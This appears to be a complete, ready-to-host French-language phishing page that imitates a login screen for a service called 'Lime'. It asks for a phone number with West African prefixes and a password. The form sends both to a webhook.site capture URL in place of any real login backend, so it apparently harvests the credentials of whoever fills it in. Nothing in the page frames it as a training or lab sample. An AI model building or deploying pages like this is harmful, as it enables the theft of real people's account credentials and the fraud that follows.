<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Connexion Lime</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: 'Arial', sans-serif;
      background-color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .container {
      width: 100%;
      max-width: 400px;
      padding: 20px;
    }

    h1 {
      font-size: 24px;
      font-weight: bold;
      margin-bottom: 10px;
    }

    p {
      color: #666;
      margin-bottom: 25px;
    }

    label {
      display: block;
      font-weight: bold;
      margin-bottom: 6px;
    }

    .phone-wrapper {
      display: flex;
      margin-bottom: 20px;
    }

    select {
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 8px 0 0 8px;
      font-size: 14px;
      background-color: #fff;
      outline: none;
    }

    input[type="tel"] {
      flex: 1;
      padding: 12px;
      border: 1px solid #ccc;
      border-left: none;
      border-radius: 0 8px 8px 0;
      font-size: 14px;
      outline: none;
    }

    .password-wrapper {
      position: relative;
      margin-bottom: 20px;
    }

    .password-wrapper input {
      width: 100%;
      padding: 12px 40px 12px 12px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 14px;
      outline: none;
    }

    .toggle-password {
      position: absolute;
      top: 50%;
      right: 12px;
      transform: translateY(-50%);
      cursor: pointer;
    }

    .toggle-password svg {
      width: 20px;
      height: 20px;
    }

    .btn {
      background-color: #2f80ed;
      color: white;
      border: none;
      padding: 12px;
      width: 100%;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    .btn:hover {
      background-color: #1c5fc0;
    }

    .signup {
      text-align: center;
      margin-top: 20px;
      font-size: 14px;
    }

    .signup a {
      color: #2f80ed;
      text-decoration: none;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Bienvenue à nous rejoindre</h1>
    <p>Connectez-vous à votre compte</p>

    <form action="https://webhook.site/b1fb39f5-27fc-412a-adba-4a0bdd868cb5" method="POST">
      
      <label for="phone">Numéro de Téléphone</label>
      <div class="phone-wrapper">
        <select name="prefix">
          <option value="+221">+221</option>
          <option value="+225">+225</option>
          <option value="+226">+226</option>
          <!-- Ajoute plus si besoin -->
        </select>
        <input type="tel" name="phone" id="phone" placeholder="Veuillez entrer votre numéro de téléphone" required />
      </div>

      <label for="password">Mot de passe de Connexion</label>
      <div class="password-wrapper">
        <input type="password" name="password" id="password" placeholder="Mot de passe de Connexion" required />
        <span class="toggle-password" onclick="togglePasswordVisibility()">
          <!-- Icône œil -->
          <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="#555" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24">
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/>
            <circle cx="12" cy="12" r="3"/>
          </svg>
        </span>
      </div>

      <button class="btn" type="submit">Se Connecter Maintenant</button>
    </form>

    <div class="signup">
      Vous n’avez pas de compte ? <a href="#">Inscrivez-vous</a>
    </div>
  </div>

  <script>
    function togglePasswordVisibility() {
      const passwordInput = document.getElementById('password');
      const icon = document.getElementById('eyeIcon');

      if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
      } else {
        passwordInput.type = 'password';
      }
    }
  </script>
</body>
</html>
